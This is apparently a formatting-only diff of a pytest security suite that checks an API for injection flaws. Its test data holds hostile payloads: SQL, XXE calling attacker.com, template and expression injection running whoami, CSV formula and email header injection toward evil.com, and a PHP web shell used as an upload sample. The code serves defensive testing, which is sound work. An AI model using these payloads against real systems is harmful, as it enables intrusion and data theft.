@@ -36,9 +36,7 @@ class TestInputValidationSecurity:
             current = current["next"]
 
         response = client.post(
-            "/api/processing/start",
-            json=nested_json,
-            headers=auth_headers
+            "/api/processing/start", json=nested_json, headers=auth_headers
         )
 
         # Should handle deeply nested JSON without crashing
@@ -47,18 +45,18 @@ class TestInputValidationSecurity:
     def test_large_payload_handling(self, client, auth_headers):
         """Test handling of oversized payloads."""
         # Test with very large JSON payload
-        large_data = {
-            "data": "A" * (10 * 1024 * 1024)  # 10MB string
-        }
+        large_data = {"data": "A" * (10 * 1024 * 1024)}  # 10MB string
 
         response = client.post(
-            "/api/processing/start",
-            json=large_data,
-            headers=auth_headers
+            "/api/processing/start", json=large_data, headers=auth_headers
         )
 
         # Should reject or handle large payloads gracefully
-        assert response.status_code in [413, 400, 422]  # Payload too large or validation error
+        assert response.status_code in [
+            413,
+            400,
+            422,
+        ]  # Payload too large or validation error
 
     def test_null_byte_injection(self, client, auth_headers):
         """Test for null byte injection vulnerabilities."""
@@ -66,22 +64,21 @@ class TestInputValidationSecurity:
             "test\x00.txt",
             "../../etc/passwd\x00.jpg",
             "file.txt\x00.php",
-            "query\x00'; DROP TABLE users; --"
+            "query\x00'; DROP TABLE users; --",
         ]
 
         for payload in null_byte_payloads:
             # Test on file operations
-            response = client.get(
-                f"/api/folders/{payload}",
-                headers=auth_headers
-            )
+            response = client.get(f"/api/folders/{payload}", headers=auth_headers)
 
             # Should handle null bytes safely
             if response.status_code == 200:
                 content = response.text
                 # Check if null byte caused unexpected behavior
                 if "\x00" in content or "passwd" in content:
-                    pytest.fail(f"VULNERABILITY: Null byte injection with payload: {payload}")
+                    pytest.fail(
+                        f"VULNERABILITY: Null byte injection with payload: {payload}"
+                    )
 
     def test_unicode_normalization_attacks(self, client, auth_headers):
         """Test for Unicode normalization attacks."""
@@ -89,14 +86,11 @@ class TestInputValidationSecurity:
             "..\\u002e\\u002e\\u005c",  # Unicode-encoded path traversal
             "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # Unicode XSS
             "\\u0027; DROP TABLE users; --",  # Unicode SQL injection
-            "\\uff1c\\uff53\\uff43\\uff52\\uff49\\uff50\\uff54\\uff1e"  # Fullwidth characters
+            "\\uff1c\\uff53\\uff43\\uff52\\uff49\\uff50\\uff54\\uff1e",  # Fullwidth characters
         ]
 
         for payload in unicode_payloads:
-            response = client.get(
-                f"/api/search?query={payload}",
-                headers=auth_headers
-            )
+            response = client.get(f"/api/search?query={payload}", headers=auth_headers)
 
             # Should normalize Unicode safely
             if payload.replace("\\u", "") in response.text:
@@ -109,7 +103,7 @@ class TestInputValidationSecurity:
             "'; DROP TABLE users; --",
             "<script>alert('XSS')</script>",
             "../../../etc/passwd",
-            "$(whoami)"
+            "$(whoami)",
         ]
 
         for payload in malicious_payloads:
@@ -118,14 +112,19 @@ class TestInputValidationSecurity:
             response = client.post(
                 "/api/processing/start",
                 json={"encoded_data": encoded_payload},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should not execute decoded malicious content
             if response.status_code == 500:
                 error_text = response.text.lower()
-                if any(keyword in error_text for keyword in ["syntax error", "command not found", "no such file"]):
-                    pytest.fail(f"VULNERABILITY: Base64 injection with payload: {payload}")
+                if any(
+                    keyword in error_text
+                    for keyword in ["syntax error", "command not found", "no such file"]
+                ):
+                    pytest.fail(
+                        f"VULNERABILITY: Base64 injection with payload: {payload}"
+                    )
 
     def test_xml_external_entity_injection(self, client, auth_headers):
         """Test for XXE (XML External Entity) injection."""
@@ -133,14 +132,12 @@ class TestInputValidationSecurity:
             """<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
             <data>&xxe;</data>""",
-
             """<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>
             <data>&xxe;</data>""",
-
             """<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]>
-            <data>test</data>"""
+            <data>test</data>""",
         ]
 
         for payload in xxe_payloads:
@@ -148,7 +145,7 @@ class TestInputValidationSecurity:
             response = client.post(
                 "/api/processing/xml",
                 data=payload,
-                headers={**auth_headers, "Content-Type": "application/xml"}
+                headers={**auth_headers, "Content-Type": "application/xml"},
             )
 
             # Should not process external entities
@@ -163,15 +160,13 @@ class TestInputValidationSecurity:
             "*)(uid=*))(|(uid=*",
             "*)(|(password=*))",
             "*))%00",
-            "admin)(&(password=*)"
+            "admin)(&(password=*)",
         ]
 
         for payload in ldap_payloads:
             # If the API uses LDAP for authentication/search
             response = client.post(
-                "/api/auth/ldap-search",
-                json={"query": payload},
-                headers=auth_headers
+                "/api/auth/ldap-search", json={"query": payload}, headers=auth_headers
             )
 
             # Should not allow LDAP injection
@@ -179,7 +174,9 @@ class TestInputValidationSecurity:
                 # Check if unauthorized data is returned
                 data = response.json()
                 if isinstance(data, list) and len(data) > expected_results:
-                    pytest.fail(f"VULNERABILITY: LDAP injection with payload: {payload}")
+                    pytest.fail(
+                        f"VULNERABILITY: LDAP injection with payload: {payload}"
+                    )
 
     def test_nosql_injection(self, client, auth_headers):
         """Test for NoSQL injection vulnerabilities."""
@@ -188,14 +185,12 @@ class TestInputValidationSecurity:
             {"$gt": ""},
             {"$regex": ".*"},
             {"$where": "this.password == 'admin'"},
-            {"$or": [{"password": {"$exists": True}}]}
+            {"$or": [{"password": {"$exists": True}}]},
         ]
 
         for payload in nosql_payloads:
             response = client.post(
-                "/api/search/nosql",
-                json={"filter": payload},
-                headers=auth_headers
+                "/api/search/nosql", json={"filter": payload}, headers=auth_headers
             )
 
             # Should not allow NoSQL injection
@@ -203,7 +198,9 @@ class TestInputValidationSecurity:
                 data = response.json()
                 # Check for unauthorized data access
                 if len(data.get("results", [])) > 100:  # Unusually large result set
-                    pytest.fail(f"VULNERABILITY: NoSQL injection with payload: {payload}")
+                    pytest.fail(
+                        f"VULNERABILITY: NoSQL injection with payload: {payload}"
+                    )
 
     def test_expression_language_injection(self, client, auth_headers):
         """Test for expression language injection."""
@@ -212,21 +209,23 @@ class TestInputValidationSecurity:
             "#{7*7}",
             "${java.lang.Runtime.getRuntime().exec('whoami')}",
             "${@java.lang.Runtime@getRuntime().exec('id')}",
-            "${{7*7}}"
+            "${{7*7}}",
         ]
 
         for payload in el_payloads:
             response = client.post(
                 "/api/processing/template",
                 json={"template": f"Hello {payload}"},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should not evaluate expressions
             if response.status_code == 200:
                 content = response.text
                 if "49" in content:  # 7*7 was evaluated
-                    pytest.fail(f"VULNERABILITY: Expression injection with payload: {payload}")
+                    pytest.fail(
+                        f"VULNERABILITY: Expression injection with payload: {payload}"
+                    )
 
     def test_server_side_template_injection(self, client, auth_headers):
         """Test for Server-Side Template Injection (SSTI)."""
@@ -236,14 +235,14 @@ class TestInputValidationSecurity:
             "{{''.__class__.__mro__[2].__subclasses__()}}",
             "${7*7}",
             "<%=7*7%>",
-            "{7*7}"
+            "{7*7}",
         ]
 
         for payload in ssti_payloads:
             response = client.post(
                 "/api/processing/render",
                 json={"template": payload},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should not execute template code
@@ -259,14 +258,14 @@ class TestInputValidationSecurity:
             "@SUM(1+1)*cmd|'/c calc'!A0",
             "+cmd|'/c calc'!A0",
             "-cmd|'/c calc'!A0",
-            '=HYPERLINK("http://evil.com","Click me")'
+            '=HYPERLINK("http://evil.com","Click me")',
         ]
 
         for payload in csv_payloads:
             response = client.post(
                 "/api/export/csv",
                 json={"data": [{"name": payload, "value": "test"}]},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should sanitize CSV output
@@ -282,14 +281,14 @@ class TestInputValidationSecurity:
             "test@example.com\nBCC: attacker@evil.com",
             "test@example.com%0ABcc: attacker@evil.com",
             "test@example.com\r\nBcc: attacker@evil.com",
-            "test@example.com%0D%0ABcc: attacker@evil.com"
+            "test@example.com%0D%0ABcc: attacker@evil.com",
         ]
 
         for payload in email_payloads:
             response = client.post(
                 "/api/notifications/send",
                 json={"to": payload, "subject": "Test", "body": "Test message"},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should prevent email header injection
@@ -301,27 +300,26 @@ class TestInputValidationSecurity:
         response_splitting_payloads = [
             "test\r\nSet-Cookie: malicious=value",
             "test%0d%0aSet-Cookie: evil=true",
-            "test\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>alert('XSS')</script>"
+            "test\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>alert('XSS')</script>",
         ]
 
         for payload in response_splitting_payloads:
-            response = client.get(
-                f"/api/redirect?url={payload}",
-                headers=auth_headers
-            )
+            response = client.get(f"/api/redirect?url={payload}", headers=auth_headers)
 
             # Should not allow response splitting
             # Check response headers for malicious content
             for header_name, header_value in response.headers.items():
                 if "malicious" in header_value or "evil" in header_value:
-                    pytest.fail(f"VULNERABILITY: HTTP response splitting with payload: {payload}")
+                    pytest.fail(
+                        f"VULNERABILITY: HTTP response splitting with payload: {payload}"
+                    )
 
     def test_parameter_pollution(self, client, auth_headers):
         """Test for HTTP parameter pollution vulnerabilities."""
         # Test multiple parameters with same name
         response = client.get(
             "/api/search?query=safe&query=malicious&filter=normal&filter=admin",
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         # Should handle parameter pollution consistently
@@ -337,7 +335,7 @@ class TestInputValidationSecurity:
         response = client.post(
             "/api/processing/start",
             json=json_data,
-            headers={**auth_headers, "Content-Type": "application/xml"}
+            headers={**auth_headers, "Content-Type": "application/xml"},
         )
 
         # Should validate content type matches content
@@ -348,20 +346,26 @@ class TestInputValidationSecurity:
     def test_file_upload_vulnerabilities(self, client, auth_headers):
         """Test for file upload security vulnerabilities."""
         malicious_files = [
-            ("test.php", b"<?php echo shell_exec($_GET['cmd']); ?>", "application/x-php"),
+            (
+                "test.php",
+                b"<?php echo shell_exec($_GET['cmd']); ?>",
+                "application/x-php",
+            ),
             ("test.exe", b"MZ\x90\x00", "application/x-msdownload"),
-            ("test.jsp", b"<%@ page import=\"java.io.*\" %>", "application/x-jsp"),
-            ("test.js", b"require('child_process').exec('whoami')", "application/javascript"),
-            ("../../../test.txt", b"Path traversal test", "text/plain")
+            ("test.jsp", b'<%@ page import="java.io.*" %>', "application/x-jsp"),
+            (
+                "test.js",
+                b"require('child_process').exec('whoami')",
+                "application/javascript",
+            ),
+            ("../../../test.txt", b"Path traversal test", "text/plain"),
         ]
 
         for filename, content, content_type in malicious_files:
             files = {"file": (filename, content, content_type)}
 
             response = client.post(
-                "/api/files/upload",
-                files=files,
-                headers=auth_headers
+                "/api/files/upload", files=files, headers=auth_headers
             )
 
             # Should reject or sanitize malicious files
@@ -378,17 +382,17 @@ class TestInputValidationSecurity:
     def test_integer_overflow_vulnerabilities(self, client, auth_headers):
         """Test for integer overflow vulnerabilities."""
         overflow_values = [
-            2**31,      # 32-bit signed integer max + 1
-            2**63,      # 64-bit signed integer max + 1
-            -2**31 - 1, # 32-bit signed integer min - 1
-            "9" * 50    # Very large number as string
+            2**31,  # 32-bit signed integer max + 1
+            2**63,  # 64-bit signed integer max + 1
+            -(2**31) - 1,  # 32-bit signed integer min - 1
+            "9" * 50,  # Very large number as string
         ]
 
         for value in overflow_values:
             response = client.post(
                 "/api/processing/calculate",
                 json={"number": value},
-                headers=auth_headers
+                headers=auth_headers,
             )
 
             # Should handle integer overflow gracefully
@@ -417,9 +421,7 @@ class TestDataValidationBypass:
         incomplete_data = {}  # Missing all required fields
 
         response = client.post(
-            "/api/processing/start",
-            json=incomplete_data,
-            headers=auth_headers
+            "/api/processing/start", json=incomplete_data, headers=auth_headers
         )
 
         # Should reject incomplete data
@@ -432,14 +434,12 @@ class TestDataValidationBypass:
             {"expected_number": "not_a_number"},
             {"expected_boolean": "maybe"},
             {"expected_array": "not_array"},
-            {"expected_object": "not_object"}
+            {"expected_object": "not_object"},
         ]
 
         for data in type_confusion_data:
             response = client.post(
-                "/api/processing/start",
-                json=data,
-                headers=auth_headers
+                "/api/processing/start", json=data, headers=auth_headers
             )
 
             # Should reject type mismatches
@@ -450,13 +450,11 @@ class TestDataValidationBypass:
         # Test with oversized strings
         oversized_data = {
             "name": "A" * 10000,  # Assuming there's a length limit
-            "description": "B" * 100000
+            "description": "B" * 100000,
         }
 
         response = client.post(
-            "/api/processing/start",
-            json=oversized_data,
-            headers=auth_headers
+            "/api/processing/start", json=oversized_data, headers=auth_headers
         )
 
         # Should enforce length limits
@@ -467,13 +465,11 @@ class TestDataValidationBypass:
         invalid_enum_data = {
             "status": "invalid_status",
             "priority": "not_a_priority",
-            "category": "nonexistent_category"
+            "category": "nonexistent_category",
         }
 
         response = client.post(
-            "/api/processing/start",
-            json=invalid_enum_data,
-            headers=auth_headers
+            "/api/processing/start", json=invalid_enum_data, headers=auth_headers
         )
 
         # Should reject invalid enum values
@@ -485,13 +481,11 @@ class TestDataValidationBypass:
             "email": "not_an_email",
             "phone": "not_a_phone",
             "url": "not_a_url",
-            "uuid": "not_a_uuid"
+            "uuid": "not_a_uuid",
         }
 
         response = client.post(
-            "/api/processing/start",
-            json=invalid_patterns,
-            headers=auth_headers
+            "/api/processing/start", json=invalid_patterns, headers=auth_headers
         )
 
         # Should reject invalid patterns
@@ -504,14 +498,12 @@ class TestDataValidationBypass:
             {"start_date": "2023-12-31", "end_date": "2023-01-01"},  # End before start
             {"quantity": -1},  # Negative quantity
             {"discount": 150},  # Discount over 100%
-            {"age": -5}  # Negative age
+            {"age": -5},  # Negative age
         ]
 
         for violation in business_violations:
             response = client.post(
-                "/api/processing/start",
-                json=violation,
-                headers=auth_headers
+                "/api/processing/start", json=violation, headers=auth_headers
             )
 
             # Should enforce business rules
